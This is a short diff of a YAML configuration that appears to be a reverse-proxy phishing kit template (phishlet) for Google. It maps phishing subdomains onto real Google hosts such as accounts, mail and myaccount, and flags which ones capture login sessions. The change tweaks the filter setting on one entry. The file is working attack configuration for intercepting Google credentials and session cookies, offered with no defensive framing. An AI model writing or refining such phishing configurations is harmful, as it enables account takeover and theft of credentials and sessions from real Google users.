@@ -6,7 +6,7 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'mail', orig_sub: 'ssl', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
-  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true  , is_landing: false, auto_filter: true}
   - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
